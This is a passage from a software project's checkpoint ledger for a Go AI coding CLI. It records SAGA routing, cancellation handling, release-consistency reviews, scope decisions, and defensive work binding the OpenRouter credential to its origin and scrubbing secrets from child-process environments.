- A temporary mutation removing the refresh call failed that test; the implementation was restored
  and the focused suite passed again.
- `TMPDIR=/tmp go test -race ./internal/engine -run '^(TestPostureCanEnterAndLeaveSAGAOnTheCurrentSession|TestSagaPostureIsAnInternalSystemDirective|TestDefaultPosturePreservesTheOrdinarySystemPrompt)$' -count=1`
  passed, followed by `git diff --check`.
- No provider turn, commit, push, tag, release, or scheduler action was performed. C2.2a is next:
  route the inline marker through the existing agent and bounded wake in the plain REPL and TUI.

#### B2.2-C2.2a — plain REPL inline routing — complete 2026-09-01

Scope:

- Route a non-empty, whitespace-delimited inline `/saga` marker through the ordinary REPL turn
  boundary before slash-command dispatch. Persist the cleaned goal, use the current agent/session for
  one bounded wake, and return to the ordinary posture afterward.
- Refuse before writing when the current directory is not inside a Git repository. Preserve wake
  errors and restore ordinary posture even when the wake fails.

Evidence:

- `runInteractivePrompt` is the shared boundary for interactive surfaces; the plain REPL recognizes
  marked prompts before its existing slash-command branch. `runSagaLoop` now accepts the current
  agent instead of constructing a second session agent.
- `saveSagaGoal` checks `requireGitRepo` before reading or writing `SAGA.md`, so an inline request
  outside a repository has no artifact side effect.
- Tests cover current-agent identity, SAGA posture during the wake, cleaned goal persistence,
  ordinary-posture restoration, wake-error propagation, and non-repository refusal. A mutation
  disabling the REPL branch caused the integration test to fail; the implementation was restored.
- `TMPDIR=/tmp go test ./internal/cli -count=1`, the focused `-race` suite for inline routing, and
  `git diff --check` passed.
- No provider turn, commit, push, tag, release, or scheduler action was performed. C2.2b is next:
  connect the same shared boundary to the TUI turn callback without bypassing its status and Esc
  cancellation handling.

#### B2.2-C2.2b — TUI inline routing — complete 2026-09-01

Scope:

- Recognize inline `/saga` before TUI slash-command, model-picker, and config-picker dispatch;
  delegate to the shared current-agent boundary, and preserve Runtime ownership of the per-turn
  cancellable context and terminal lifecycle.
- Keep ordinary prompts and existing slash commands unchanged. Escape must cancel an active SAGA wake,
  drop queued work according to Runtime's existing contract, and allow the TUI to shut down cleanly.

Evidence:

- The TUI turn callback now routes non-empty inline markers through `runInteractivePrompt`; a marker
  at the beginning of a request is covered so it cannot be mistaken for `/saga` command dispatch.
- Tests prove the callback uses the exact current agent/session, observes `PostureSaga` during the
  wake, restores ordinary posture, and receives cancellation from an actual Escape byte. The
  cancellation test is bounded and closes input through Runtime's EOF/join path after Escape.
- A mutation disabling the TUI inline branch caused the current-session integration test to fail;
  the implementation was restored.
- `TMPDIR=/tmp go test ./internal/cli -count=1`, focused inline-routing `-race` tests, and
  `git diff --check` passed. No provider turn, commit, push, tag, release, or scheduler action was
  performed. C3.1 is next: harden wake lifecycle, durable progress visibility, and Esc
  terminal-state behavior as one checkpoint.

#### C3.1 — durable executing-before-work state — complete 2026-09-01

Scope:

- Persist the selected chapter after it enters `executing` and before any worker can mutate the
  repository. This applies equally to a hand-authored pending chapter and a chapter just appended by
  the planner.
- If the pre-work artifact write fails, stop the wake before provider or repository work, preserve
  the executing in-memory marker for a truthful retry boundary, and do not add a failure strike or
  describe storage failure as a chapter failure.

Evidence:

- `RunChapter` now writes the in-flight state before invoking `Worker.Work`; `RunWake` recognizes the
  typed artifact persistence failure and returns it without failure-loop handling.
- Tests prove the worker observes durable `executing` state for existing and planner-created chapters,
  and prove a write failure leaves the worker untouched in `executing` state.
- The existing failed-worker test now asserts the honest two-write sequence: `executing`, then
  `failed`; no second chapter is attempted.
- `TMPDIR=/tmp go test ./internal/engine -count=1`, focused `-race` coverage for saga/chapter/wake/
  posture, and `git diff --check` passed. A mutation removing the pre-work persistence guard failed
  the new regression test and was restored.
- No provider turn, commit, push, tag, release, or scheduler action was performed. C3.2 is next:
  harden wake cancellation and terminal-state handling across the TUI and durable artifact.

#### C3.2a — durable terminal-state normalization — complete 2026-09-01

Scope:

- Treat `completed` and `blocked` whole-saga statuses as authoritative terminal states on every
  wake; a pending chapter in a hand-edited artifact must not silently reopen either terminal saga.
- Persist `completed` when acceptance criteria finish or a planner truthfully reports no more work.
  Preserve `in-progress` for `wake-complete`, chapter, cost, chapter-count, and timeout stops because
  those are resumable pauses rather than terminal outcomes.
- If the terminal status write fails, return the artifact error and do not report a successful stop;
  retain the in-memory terminal marker so retry diagnostics cannot lie about the outcome.

Evidence:

- `SagaRunner.Run` and `RunWake` now honor durable terminal state before planning or working, and
  normalize goal completion/doom-loop stops through one persistence boundary. Status constants are
  shared by the artifact formatter, strike accounting, and inline goal creation.
- Tests prove completion is written once, terminal persistence failure is surfaced, and completed or
  blocked artifacts do not run pending chapters. Budget pause behavior remains covered by the
  existing stop-reason tests.
- `TMPDIR=/tmp go test ./internal/engine -count=1` and focused saga/chapter/wake/posture `-race`
  tests passed. A mutation replacing the terminal status assignment with an empty value was caught by
  the completion persistence and persistence-failure tests and restored. `git diff --check` passed.
- No provider turn, commit, push, tag, release, or scheduler action was performed. C3.2b is next:
  harden cancellation boundaries while preserving the resumable executing marker and truthful TUI
  terminal lifecycle.

#### C3.2b1 — cancellation-error preservation — complete 2026-09-01

Scope:

- Preserve the context cancellation as the terminal outcome while retaining any error raised while
  persisting the resumable `executing` state. This applies to both the bounded `RunWake` API and the
  older continuous `Run` API so callers cannot receive different truth about the same failure.
- Keep cancellation non-striking and resumable; do not convert the interrupted chapter into failed
  work or report a successful wake when its durable cleanup write failed.

Evidence:

- Both executor APIs now pass chapter results through one cancellation-result helper. It returns a
  full joined error when cancellation and cleanup fail together, and joins an unrelated worker error
  with the active context cancellation when necessary.
- Tests cover worker cancellation with a failing second artifact write for `RunWake` and `Run`, plus
  a direct joined-cause invariant. The chapter remains `executing`, strikes remain zero, and exactly
  two persistence attempts are observed.
- `TMPDIR=/tmp go test ./internal/engine ./internal/cli -count=1`, focused saga/chapter/wake/posture
  `-race` tests, and `git diff --check` passed. A mutation removing joined-cause preservation was
  caught by `TestSagaCancellationResultPreservesJoinedCauses` and restored.
- No provider turn, commit, push, tag, release, or scheduler action was performed. C3.2b2 is next:
  prove Escape leaves the TUI in one truthful interrupted/ready terminal state without stale queued
  work or a post-cancellation turn.

#### C3.2b2 — TUI interrupted/ready lifecycle — complete 2026-09-01

Scope:

- Keep the inline SAGA wake on Runtime's cancellable turn protocol. Escape must cancel the active wake,
  preserve the visible interrupted lifecycle, clear queued work, and prevent a queued request from
  starting after cancellation.
- Refresh the CLI bridge with the actual terminal lifecycle (`ready`, `interrupted`, or `failed`) after
  a turn instead of relabeling a completed SAGA wake as `working` during the handoff.

Evidence:

- The TUI bridge now classifies the returned turn context/error before refreshing model/session
  metadata; Runtime still owns the final locked terminal transition and transcript interruption marker.
- A bounded staged-input test sends an inline SAGA request, queues a follow-up, presses Escape, and
  asserts one turn only, an `interrupted` lifecycle, an empty queue/draft, and clean runtime shutdown.
  The existing CLI integration test continues to prove Escape reaches the current SAGA agent and
  restores ordinary posture.
- `TMPDIR=/tmp go test ./internal/cli ./internal/tui -count=1`, focused CLI/TUI `-race` tests, and
  `git diff --check` passed. A mutation changing the cancellation classification to `working` was
  caught by `TestTUITurnLifecycleDoesNotRelabelTerminalTurnsAsWorking` and restored.
- No provider turn, commit, push, tag, release, or scheduler action was performed. C3.2 is closed;
  C4.1 is complete; C4.2 is next: independently review the remaining ledger, release line, and
  documentation truth before any release claim.

#### C4.1 — consolidated repository gate baseline — complete 2026-09-01

Scope and invariant:

- Run the complete repository gate against the accumulated C3 worktree, with no production-behavior
  change introduced by this leaf.
- The gate must either pass every repository check or identify one reproducible failure that is
  repaired and rerun through the same gate. A formatter disagreement must not be called green merely
  because the standalone `gofmt` command accepts the file.

Red and repair:

- The first `TMPDIR=/tmp make check` run executed all tests and cross-platform compilation, then
  stopped in the installed `golangci-lint v2.13.1` formatter at
  `internal/tui/runtime_test.go:64`; its canonical diff elided the repeated `[]byte` element type
  in the staged Escape/EOF input literals.
- The defect was limited to the new regression test. The two literals were changed to the linter's
  exact canonical form (`{0x1b}` and `{0x04}`); no runtime or test assertion was changed.

Green and adversarial checks:

- `TMPDIR=/tmp go test ./internal/tui -count=1` passed.
- `gofmt -l internal/tui/runtime_test.go`, `golangci-lint run ./internal/tui`, and `git diff --check`
  all passed after the repair. The formatter was checked both through the repository `make fmt-check`
  target and the installed linter's own formatter diagnostics.
- The focused TUI test still passes after the exact formatter normalization; no test-only workaround
  or ignored lint finding was added.

Repository gate and independent check:

- The final `TMPDIR=/tmp make check` passed: 3,079 tests; architecture, purity, build tags,
  Darwin/Linux/Windows platform matrices, lint, budgets, site, v0.1 surface, installer, protocol/
  spec, release, release workflow, release verifier, smoke workflow, plan, and workflow-pin checks
  all passed. The binary budget was 9.46 MB, cold-start p50 was 3.7 ms, and the plan ratchet passed
  101 checks.
- The installed linter independently rejected and then accepted the exact file representation,
  providing the required second formatter implementation check for this leaf. No separate provider
  turn or external reviewer was needed for this mechanical formatting-only repair; the independent
  ledger/release-line review is explicitly C4.2.

Walk-back:

- The first failed gate, repair, focused rerun, and final full-gate result are preserved here and in
  `docs/build-log.md`. No provider turn, commit, push, tag, release, or scheduler action was
  performed. C4.2 is next.

#### C4.2 — independent ledger and release-line review — active 2026-09-01

This review is subdivided into one read-only inventory leaf, one release-line consistency leaf, and
one closeout rerun. Only the active subcheckpoint may edit the ledger; no production code belongs in
this review unless a concrete correctness defect is found.

**Active subcheckpoint:** C4.2a — ledger inventory and stale-claim correction — is complete. C4.2b —
release-line consistency — and C4.2c — independent closeout rerun and disposition — are complete;
C4.2 is closed. The next boundary is V34.0c — owner scope freeze.

#### C4.2a — ledger inventory and stale-claim correction — complete 2026-09-01

Scope and invariant:

- Read `PLAN.md`, this ledger, the V34 plan, and the build log without changing production behavior.
- Every V34 subcheckpoint and every still-open historical ledger family has one visible disposition:
  complete, partial, queued, superseded, deferred/owner-dependent, or blocked by an environment.
  A partial implementation must not be promoted to complete merely because a related test is green.

V34 inventory at this review boundary:

| Phase | Complete | Partial/active | Queued or owner-dependent | Next owner/evidence |
|---|---|---|---|---|
| V34.0 baseline | `V34.0a` | `V34.0b` | `V34.0c` | C4.2 inventory, then owner scope freeze |
| V34.1 security | `V34.1f` | — | `V34.1a–e` | endpoint, environment, checkpoint, output, and full-auto boundaries |
| V34.2 integrity | — | — | `V34.2a–f` | process close, snapshots, rewind, replay, joined cancellation, cost reservation |
| V34.3 saga | — | `V34.3f` through C4.1 | `V34.3a–e` | transactional stop/rollback/accounting/crash proof; C5 supplies visible progress |
| V34.4 product truth | — | — | `V34.4a–d` | subscription/catalog/provider/local-support evidence |
| V34.5 release proof | — | — | `V34.5a–e` | platform, clean machine, reproducible artifact, surface audit, final review |
| V34.6 closure | — | — | `V34.6a–c` | owner trial, closure audit, release decision |

The table is intentionally explicit about `V34.3f`: B1, B2, C2, C3, and C4.1 are recorded as
complete in this ledger, but the V34 item also promises visible running TUI progress, which is C5
and remains unbuilt. The V34 plan is therefore `[~]`, not falsely `[x]`. The same review moved A12.5
to verified because the exact budget and architecture evidence now exists.

Historical open, superseded, and deferred entries are mapped as follows:

| Ledger entry | Disposition at C4.2a | V34 mapping / owner |
|---|---|---|
| Owner-trial `kolk` clean-shell box and clean-machine smoke; `T0.5` | queued, environment/owner-dependent | `V34.5b` and `V34.6a`; requires a machine without Go or prior Kolkrabbi state |
| `S10.1d2` read-end close and post-result drain | genuinely open | `V34.2a`; provider shutdown must join readers without truncating successful output |
| `S10.1d5` typed history-loss warning and prior-conversation label | genuinely open | `V34.2d`; warning/event vocabulary and replay contract remain unbuilt |
| `S10.1e` priority-1 vendor captures | owner-dependent evidence | `V34.0c`/`V34.5e`; requires the owner's vendor login and must not be called an offline pass |
| `A12.2` SQLite store and `A12.3` SQLite ingestion | explicitly superseded | retain history; item 17's JSONL decision is the accepted path |
| `A12.4` query/handler shape | partly superseded, remaining API question open | owner decision under item 26 and `V34.0c`; dashboard page does not prove `/v1/stats/*` |
| `A12.5` budget/architecture verification | verified in this leaf | current full gate is recorded above; parent A12 remains partial because its other decisions remain |
| `A13` Windows runtime and required CI | deferred, not shipped | `V34.5a`; Windows cross-build is advisory until owner accepts runtime support |
| `A14` additive product leaves | partial migration record | delivered TUI/agent adapters/SAGA map to `V34.1f`/`V34.3f`; group recheck remains owner work |
| `A15` generated client proof and `A16` desktop/mobile clients | deferred candidates | `V34.0c`; neither is accepted v1 scope yet |
| `A6.2`/`A6.3` event vocabulary, entities, commands, and deferred subentities | partial/deferred protocol work | `V34.2d` for terminal/replay behavior; remaining schema scope requires `V34.0c` |
| PLAN items `1`, `24`, `25`, and `34` marked `[~]` | intentionally partial | release/owner scope → `V34.0c`/`V34.5`; subscription truth → `V34.4`; local truth → `V34.4d`; overall finish → all V34 phases |

No entry was deleted or silently promoted. Superseded SQLite and sidecar decisions remain historical;
the unresolved entries are now named owners or V34 leaves rather than being mistaken for release
evidence.

Verification:

- The inventory was cross-checked against every V34 checklist line and every still-open/partial
  checkpoint entry returned by `rg -n '^\s*[-*] \[[~ ]\]' CHECKPOINTS.md`.
- `A12.5` was closed only after the already completed `TMPDIR=/tmp make check` evidence: 3,079 tests,
  9.46 MB, 3.7 ms p50, and all repository gates green. `make plan-check` passed 101 checks after the
  walk-back, and `gofmt -l .` plus `git diff --check` produced no output.
- C4.2b is deliberately not included here: release-line metadata, exact tag identity, stamped build
  output, and release-contract reruns are its next isolated review.

No provider turn, commit, push, tag, release, or scheduler action was performed. C4.2b is next.

#### C4.2b — release-line consistency — complete 2026-09-01

Scope and invariant:

- Verify that the current release line is one coherent identity across the checked-out refs, remote
  refs, GoReleaser configuration, stamped build metadata, site/docs claims, help surface, and release
  contracts.
- Distinguish an intentionally unstamped development build and a release-shaped build made from this
  dirty worktree; neither may be mistaken for a published artifact.

Evidence:

- `main` and `origin/main` both resolve to `5074e6206780c5590417a21da9512c25fea04207`. The local
  annotated `v1.2.32` tag dereferences to that same commit, and `git ls-remote` confirmed the remote
  `v1.2.32` tag and `main` point to the same object.
- `.goreleaser.yaml` stamps release builds with `.Version`, and its snapshot template is explicitly
  `1.2.32-dev.{{ .ShortCommit }}`. The site badge and release contract both identify `v1.2.32` as
  current. The `v1.2.3` string in README is an instructional signature example, not a current-release
  claim.
- `go run ./cmd/kolk version` correctly reported the unstamped development identity `kolk dev
  go1.27.0 linux/amd64`. A release-shaped local build stamped with `1.2.32`, commit `5074e6206780`,
  and a fixed date reported `kolk 1.2.32 (...) go1.27.0 linux/amd64`; its `+dirty` commit suffix is
  expected because the accumulated worktree is intentionally not clean. The help output included
  the current `model`, `serve`, `version`, and `help` surfaces without a separate SAGA command family.

Independent and contract checks:

- `./scripts/check-release-tag.sh v1.2.32` passed.
- `make release-check release-workflow-check release-verifier-check` passed: 24, 41, and 30 checks.
- `./scripts/test-site.sh` passed 162 checks. These were rerun independently of the earlier full
  `make check` and agree with its release-related results.
- No release-line mismatch, stale current-version claim, or tag divergence was reproducible; no code
  change was warranted. C4.2c owns the independent closeout rerun and final disposition rather than
  being implied by these consistency checks.

No provider turn, commit, push, tag, release, or scheduler action was performed. C4.2c is next.

#### C4.2c — independent closeout rerun and disposition — complete 2026-09-01

Scope and invariant:

- Recheck the complete C4.2 ledger and release-line review after its documentation walk-back, using a
  separate read-only reviewer plus local race and repository-gate reruns.
- Close C4 only if the documented next leaf is honest, no V34 completion claim hides an open scope,
  and no release action is implied by a green development worktree.

Independent review:

- A separate read-only reviewer inspected the V34 plan, `PLAN.md`, `CHECKPOINTS.md`, build log,
  release configuration/scripts/workflows, and refs. It reported `CLEAN`: V34 statuses and mappings
  are coherent, the current release line is consistent, and the next disposition is C4.2c followed
  by V34.0c scope freeze. The reviewer changed no files and performed no remote mutation.
- `TMPDIR=/tmp go test -race ./internal/cli ./internal/engine ./internal/tui ./internal/provider/agentcli ./internal/shell -count=1` passed all five packages.
- The final post-walk-back `TMPDIR=/tmp make check` passed: 3,079 tests; architecture, purity, build
  tags, Darwin/Linux/Windows platform matrices, lint, budgets, site, v0.1 surface, installer,
  protocol/spec, release, release workflow, release verifier, smoke workflow, plan, and workflow-pin
  checks all passed. The plan ratchet passed 101 checks.

Disposition:

- C4.2 is closed. V34.0b is now complete; V34.3f remains partial because C5's visible TUI
  progress-log work is still queued. The V34 program remains open with V34.0c owner scope freeze as
  the next leaf; V34.1–V34.6 cannot be claimed complete from this gate alone.
- No provider turn, commit, push, tag, release, or scheduler action was performed. The dirty
  worktree remains the user's accumulated change set.

Required evidence before implementation or release work proceeds:

- a read-only review of `PLAN.md`, the V34 plan, this checkpoint ledger, and `docs/build-log.md`;
- an exact table of remaining queued/superseded/deferred items and their owners, with stale claims
  either corrected or explicitly preserved as historical records;
- a release-line check proving the version in build metadata, help/docs, tags, and release gates agree;
- independent reruns of the relevant focused gates and a documented decision about which V34 leaf is
  next. No code change belongs in C4.2 unless the review finds a concrete correctness defect.

#### V34.0c — owner scope freeze — complete 2026-09-02

This owner-decision checkpoint is subdivided so that evidence, acceptance, documentation walk-back,
and independent review cannot be confused with one another. Production implementation begins only
after the accepted matrix is reflected and independently checked.

- [x] **V34.0c.1 scope evidence inventory** — compare the current binary/help surface, README, site,
  provider-plan catalog, local-model contract, platform matrix, release configuration, and V34
  definition of done. Record what is executable now, what is advisory or unsupported, and what is
  still only designed or planned. This leaf makes no scope decision.
- [x] **V34.0c.2 owner scope acceptance** — owner accepted the bounded v1 capability/platform matrix
  on 2026-09-01; OS-level sandboxing is included as accepted v1 work and the owner confirms the
  clean-machine/provider proof was performed. The acceptance is a scope decision, not a claim that
  every accepted implementation is already shipped.
- [x] **V34.0c.3 scope walk-back** — completed 2026-09-02: updated the V34 plan, README, capabilities
  site, help/command claims, provider/local contracts, and release notes so every accepted promise
  has an owner/evidence path and every deferred item has a reason and revisit trigger. Re-run the
  plan, site, surface, and release documentation gates.
- [x] **V34.0c.4 scope exit review** — completed 2026-09-02: an independent reader verified that
  the accepted matrix is reflected consistently, that unimplemented accepted work is not labeled
  available, and that clean-machine/provider evidence is distinguished from repository-local gates.

##### V34.0c.1 evidence inventory — complete 2026-09-01

Observed executable boundary:

| Area | Evidence from the current tree | Scope meaning at this leaf |
|---|---|---|
| Runtime platforms | `scripts/check-platforms.sh` compiles Darwin amd64/arm64, Linux amd64/arm64, and Windows amd64; README says Windows is advisory and unsupported | macOS/Linux amd64+arm64 are runtime targets; Windows is cross-build-only unless accepted later |
| Gateway/local model access | Help exposes `--base-url` for OpenAI-compatible endpoints; README and `docs/plan/25-managed-local-models.md` define OpenRouter-compatible endpoints and host Ollama | OpenRouter-compatible endpoints and host Ollama are current paths, subject to the local contract's explicit-choice rules |
| Subscription access | `kolk pmodels` exposes Claude Pro/Max and ChatGPT Plus/Pro rows; Claude/Codex use provider-owned CLIs; Gemini rows explicitly say `unsupported subscription` | Claude and Codex are current subscription paths; Gemini and the remaining provider matrix are not runnable subscription scope |
| Modes and orchestration | Help exposes chat/code/agent; README and the capabilities page describe concurrent dependency-aware agent work | Chat, code, agent, effort, routing, and current orchestration are executable claims, with visible TUI progress logging still separate under C5 |
| SAGA | Inline `/saga` is documented and the standalone run/resume/status/stop product surface is absent; V34.3f remains partial because C5 is queued | Inline bounded SAGA is current behavior; durable progress-log observability is not yet a closed v1 proof |
| Interfaces | Help exposes CLI/TUI, sessions, stats, dash, serve, devices, and localia-related surfaces; the site marks clients/themes as planned where applicable | Current CLI/TUI and local service/dashboard surfaces are candidates for v1; future client work is not silently included |
| Safety boundaries | README states no general execution sandbox; V34.1f's delegated capability envelope is complete; item 13 defines OS sandboxing as later work | Existing permission/capability boundaries are shipped; OS-level sandboxing is accepted v1 scope but remains unimplemented until V34.1e |
| Release truth | `v1.2.32`, HEAD, `origin/main`, and the annotated tag agree; release, workflow, verifier, site, and platform checks pass; the owner reports clean-machine/provider proof complete | The release line is internally consistent; the owner-provided clean-machine/provider proof is accepted for scope disposition and must remain distinguishable from local repository gates |

Accepted owner decision (2026-09-01): keep the current macOS/Linux CLI/TUI product, OpenRouter and
compatible endpoints, host Ollama, Claude/Codex subscription handoff, current agent/SAGA surfaces,
sessions/dashboard/service, existing permission boundaries, and OS-level sandboxing inside bounded
v1. Defer Windows runtime support, desktop/iPad/Android clients, additional subscription providers,
generated clients, and any still-open provider/local/release implementation work until their named
V34 leaves have evidence. The owner also confirms the clean-machine/provider proof was performed;
that evidence is owner-supplied and is not conflated with the repository-local release gates. C5's
visible TUI progress log remains a prerequisite for claiming the full SAGA workflow, not an assumed
completion of this scope leaf.

Acceptance record for V34.0c.2:

- The owner explicitly added OS-level sandboxing to v1. Its implementation remains an open V34.1e
  boundary and must not be represented as an available feature until its platform-specific controls,
  refusal explanations, and negative tests exist.
- The owner explicitly confirmed the clean-machine/provider proof was completed. The proof is accepted
  as the owner's scope evidence here; V34.5b remains the place for its exact reproducible transcript
  and V34.5c–e remain independent release-candidate evidence.
- Extra subscription providers, desktop/mobile clients, and Windows runtime remain deferred rather
  than silently promoted by the sandbox decision.

Verification:

- `go run ./cmd/kolk help` and `go run ./cmd/kolk pmodels` matched the documented command and plan
  surfaces; the output showed no standalone SAGA command family and marked Gemini subscription rows
  unsupported.
- `./scripts/check-platforms.sh` passed the five compile targets; `./scripts/check-release-tag.sh
  v1.2.32` passed.
- `make release-check release-workflow-check release-verifier-check` passed 24, 41, and 30 checks;
  `./scripts/test-site.sh` passed 162 checks.
- No production files, release refs, credentials, or remote state were changed. The worktree remains
  intentionally dirty from the accumulated change set.

Disposition: V34.0c.1–c.4 are complete. V34.0 is closed; V34.1a credential-to-endpoint binding is
the next implementation boundary.

##### V34.0c.3 scope walk-back — complete 2026-09-02

Current-facing scope was reconciled without changing production behavior:

- `README.md` and the capabilities page now say the current binary has no OS sandbox while marking
  Linux/macOS OS-level isolation as accepted v1, designed-but-unshipped work. Windows runtime and
  desktop/mobile clients remain explicitly deferred.
- `PLAN.md` and plans 13, 23, and 34 carry the owner amendment. The sandbox matrix separates shipped
  in-process controls, accepted native isolation, and post-v1 container execution; V34.1e owns the
  mechanism, fail-closed policy, diagnostics, and native negative proof.
- Plan 24 now reflects the actually shipped Claude/Codex handovers and freezes every other
  subscription provider post-v1. Plan 25 records host Ollama as accepted v1 while retaining V34.4d's
  executable lifecycle/hardware proof.
- The top-level clean-shell, clean-machine, and T0.5 boxes now record the owner's 2026-09-01 proof.
  They do not pretend that a repository-local script reran the external machine; V34.5b owns the
  durable transcript link.
- `CHANGELOG.md` was intentionally unchanged: this checkpoint changes accepted scope and
  documentation, not released runtime behavior. Release-facing README/site wording and the release
  contract gates are the applicable surfaces.

Verification:

- `git diff --check` passed.
- `make plan-check` passed 101 checks.
- `./scripts/test-site.sh` passed 162 checks and `./scripts/test-v01-surface.sh` passed 15 checks.
- `make release-check release-workflow-check release-verifier-check` passed 24, 41, and 30 checks.

No production code, provider turn, commit, push, tag, release, credential, or remote state changed.
At the V34.0c.3 boundary, V34.0c.4 was the next and only active scope leaf.

##### V34.0c.4 independent scope-exit review — complete 2026-09-02

McClintock, a separate read-only reviewer, inspected the accepted scope matrix and every current-
facing surface changed by V34.0c.3. The reviewer returned `CLEAN` and changed no files. It confirmed:

- OS-level sandboxing is accepted v1 but never labeled available; V34.1e still owns implementation
  and native negative proof.
- Windows runtime, desktop/iPad/Android, additional subscription providers, generated clients, and
  containerized SAGA remain post-v1.
- Claude/Codex and host Ollama are current paths while V34.4 retains tier, catalog, and local-runtime
  proof.
- Owner-confirmed clean-machine/provider evidence remains distinct from local gates, with V34.5b
  owning its durable transcript link.
- V34.1e, V34.3f/C5, V34.4, V34.5c–e, and V34.6 remain open; the review did not promote downstream
  implementation or release work.

Independent commands all passed: `git diff --check`; `make plan-check` (101); site (162); v0.1
surface (15); and release, release-workflow, and release-verifier gates (24/41/30). The reviewer also
searched for stale current-facing sandbox deferrals, open T0.5 claims, and unbuilt Claude/Codex
handover claims; only clearly dated or explicitly superseded historical records remained.

V34.0 is now closed. No production code, provider turn, commit, push, tag, release, credential, or
remote state changed. The mandatory forward order makes V34.1a the next leaf; C5 remains queued under
the still-partial V34.3f boundary.

#### V34.1a — credential-to-endpoint binding — active 2026-09-02

**Owner:** Codex. **Risk:** P1 credential exfiltration. **Affected boundaries:** CLI flag/environment/
saved-config endpoint resolution, credential resolution, provider client construction, catalog and
turn HTTP transports, debug/help wording, and test fixtures that currently treat a replacement host
as OpenRouter.

Invariant:

> An OpenRouter credential may leave the process only on a request bound to the canonical
> `https://openrouter.ai` origin. A general `--base-url`, `OPENROUTER_BASE_URL`, saved `base_url`,
> later `Client.BaseURL` mutation, redirect, lookalike host, scheme downgrade, or port change cannot
> cause that credential to be attached. A non-OpenRouter compatible endpoint is credentialless
> unless a future endpoint-specific credential is explicitly bound to that canonical origin.

Chosen model: **trusted endpoint**, not implicit endpoint-specific reuse. The current credential
manifest contains an `openrouter` credential, not a credential for an arbitrary compatible server.
V34.1a therefore binds it only to canonical OpenRouter and makes custom compatible endpoints keyless.
An authenticated LiteLLM/vLLM/custom gateway needs a future explicit endpoint credential reference;
reusing the OpenRouter secret because it is the only secret available is forbidden.

Non-goals:

- No new `--api-key` flag, generic key environment variable, credential profile/schema, proxy trust
  exception, certificate pinning, DNS policy, provider adapter, or automatic migration.
- No URL-userinfo/log-output repair; V34.1d owns rejecting userinfo and bounding/scrubbing outputs.
- No change to host Ollama routing, provider-owned Claude/Codex login, model selection, billing,
  retries, redirects, or catalog ranking except where the credential boundary requires a test fixture
  to become explicitly keyless.

Subcheckpoints, one at a time:

- [x] **V34.1a.0 threat model and executable red evidence** — trace all endpoint and key sources,
  identify every authenticated request path, select the trusted-endpoint model, and preserve a
  concrete existing test that demonstrates the leak.
- [x] **V34.1a.1 origin-bound transport** — write the negative tests first, then make a credential-
  carrying transport require an immutable canonical allowed origin and refuse mismatches before
  network I/O. Cover direct BaseURL mutation as well as redirects.
- [x] **V34.1a.2 startup/client construction** — completed 2026-09-02: resolve the endpoint before the key requirement;
  construct an authenticated OpenRouter client only for the canonical endpoint and a keyless
  compatible client otherwise. Prove flag, environment, saved-config, and default precedence.
- [x] **V34.1a.3 adversarial and compatibility matrix** — completed 2026-09-02: eighteen replacement
  shapes × {catalog, turn, key verification} refused before network; seven canonical spellings
  bind and reach only `https://openrouter.ai`; cancellation, host, and compatible routes covered;
  startup matrix proves keyless endpoints never open the credential manifest. One request-shape
  divergence (usage extension keyed on a host substring) found and fixed.
- [x] **V34.1a.4 walk-back and independent closeout** — completed 2026-09-02: help/settings/config/
  README/SECURITY/site/plan wording says a non-OpenRouter endpoint is keyless; eight guard mutations
  each caught by a focused test with byte-identical restore; the independent reviewer broke the
  binding once (U+0130 case-fold vs IDNA), the hole was closed, and re-review returned CLEAN with a
  7,054-candidate reverse scan; `make check` green at 3,190 tests.
- [x] **V34.1b login handover environment** — the third child path. F2 proved the one-shot and
  persistent delegated children never inherit a credential-shaped variable; `docs/plan/34` V34.1b
  stayed part-done because the interactive `/plans login` handover (`shell.Handover`, the child that
  gets the keyboard) had no proof. Inspection 2026-09-05: it has no scrubbing either — `exec.Cmd.Env`
  is left nil, so the vendor's login process inherits the whole parent environment, the parent's own
  `OPENROUTER_API_KEY` included. **Scope:** `Handover` builds its environment with `inheritedEnv(nil)`,
  the same denylist as the other two paths, and a sentinel test on this path mirrors
  `TestChildrenNeverInheritASentinelSecretOnEitherPath`. **Non-goals:** which login runs and how the
  terminal is handed over are untouched; the own-window runner is inspected and recorded, not changed.
  **Red:** the sentinel test observes canaries in the handover child's environment before the fix.
  **Closed 2026-09-05, on main.** Red observed: `TestHandoverNeverInheritsASentinelSecret` read all
  twelve canaries back from the handover child (`-mod=mod|OPENROUTER_API_KEY-canary|…`). Green: one
  line, `cmd.Env = inheritedEnv(nil)`, the denylist the other two paths use; `GOFLAGS` survives, so it is
  a denylist and not an empty environment. **Scope widened by inspection, recorded here:** the non-goal
  said the own-window runner would be inspected, not changed. Inspection found `LoginWindow` had the
  same nil `Env` — the emulator inherits kolk's environment and hands it to the `sh -c` running the
  login — so the same defect got the same one-line fix and its own sentinel test, with a fake
  `$TERMINAL` that execs whatever follows `-e` standing in for the emulator (red observed first: six
  canaries back). On macOS a GUI terminal launched through the emulator table may or may not pass its
  environment down; scrubbing one process early makes the question moot. Three child paths, three
  proofs. `-race` clean on shell and cli; lint clean on darwin and linux; `make check` all gates.
  `docs/plan/34` V34.1b ticked.
- [~] **V34.1c confidential, symlink-safe checkpoints** — `docs/plan/34` V34.1c, subdivided 2026-09-05
  before code because its three clauses are three separable red→green pairs. Inspection: the copy
  store (`internal/checkpoint.Store.Record`/`RewindLastTurn`) reads the source through symlinks,
  records no mode, and restores with `os.WriteFile(path, data, 0o644)` — which follows a symlink
  planted at the path and flattens a 0600 file to 0644. The shadow store restores through
  `git checkout`/`reset --hard`, which recreates files at umask mode, so it flattens 0600 too. `/diff`
  prints a backup's contents unscrubbed. **Non-goals:** `/undo`/`/rewind` semantics (item 15), the
  choice of store (item 32), the jail (already resolves symlinks before a write is allowed).
  - [x] **V34.1c.1 restrictive modes survive a rewind** — copy store: `Entry.Mode` recorded at
    `Record`, restored with it (older manifests without a mode fall back to the file's current mode,
    then 0644). Shadow store: the modes of the paths about to be restored are read before the git
    restore and reapplied after, for every path that still exists. **Red:** a 0600 file rewound under
    each strategy comes back 0644.
    **Closed 2026-09-05, on main.** The first red attempt did not go red, and that was the finding:
    `os.WriteFile` on an *existing* file truncates in place, keeping the inode and its mode, so the
    copy store never had the bug for a file that still existed. The red is the file removed between
    the edit and the undo (a `rm` by bash, then `/undo`): the restore has to create it, and creating
    is where 0644 was invented — observed `mode after rewind = 644`. Green: `Entry.Mode` is recorded
    at `Record` (omitted from JSON when zero, so older manifests still load) and `writeRestored`
    writes with it and chmods afterwards; a zero mode keeps the file's current mode and invents 0644
